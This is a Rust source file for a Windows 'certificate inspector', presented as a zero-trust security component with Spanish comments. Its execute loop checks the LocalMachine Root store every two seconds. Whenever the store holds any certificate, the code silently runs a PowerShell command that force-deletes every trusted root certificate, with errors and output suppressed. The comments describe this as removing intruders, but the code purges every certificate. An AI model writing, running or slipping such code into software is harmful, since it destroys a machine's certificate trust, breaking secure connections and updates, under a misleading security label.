/*
 * File: mod.rs                                                                *
 * Path: b:\Proyectos\rust\Formic\apps\core\src\domain\inspectors\certs\mod.rs *
 * Project: certs                                                              *
 * Author: pi-maaster77                                                        *
 * Created Date: We/10/2026 16:02:19                                           *
 * Last Modified: Thu Oct 15 2026                                              *
 *                                                                             *
 * License: GNU General Public License v3.0 (GPLv3)                            *
 * This program is free software: you can redistribute it and/or modify        *
 * it under the terms of the GNU General Public License as published by        *
 * the Free Software Foundation, either version 3 of the License, or           *
 * (at your option) any later version.                                         *
 */


use crate::logger::{self, ComponentLoggerGuard};
use tracing::{info, warn, error};
use schannel::cert_store::CertStore;
use std::thread;
use std::time::Duration;
use std::process::{Command, Stdio};

pub struct CertsInspector {
    component_name: String,
    _logger_guard: ComponentLoggerGuard,
}

impl CertsInspector {
    pub fn new(component_name: &str) -> Self {
        let guard = logger::init_component_logger(component_name);
        info!(component = component_name, "Subsistema de certificados en modo Cero-Confianza Absoluto.");

        Self {
            component_name: component_name.to_string(),
            _logger_guard: guard,
        }
    }

    pub fn execute(&self) -> anyhow::Result<()> {
        info!(
            component = %self.component_name,
            "Iniciando escaneo activo y purga de confianza..."
        );

        loop {
            match CertStore::open_local_machine("Root") {
                Ok(store) => {
                    let count = store.certs().count();

                    if count > 0 {
                        // Limpieza inmediata si se detecta cualquier intruso
                        self.purge_certificates();
                    }
                }
                Err(e) => {
                    error!(
                        component = %self.component_name,
                        error = %e,
                        "Fallo al abrir el almacén raíz."
                    );
                }
            }

            // Sondeo ultrarrápido y ligero
            thread::sleep(Duration::from_secs(2));
        }
    }

    /// Ejecución optimizada y directa para minimizar latencia
fn purge_certificates(&self) {
    let _ = Command::new("cmd")
        .args(&["/C", "powershell -Command \"Get-ChildItem Cert:\\LocalMachine\\Root | Remove-Item -Force -ErrorAction SilentlyContinue\""])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn();
}
}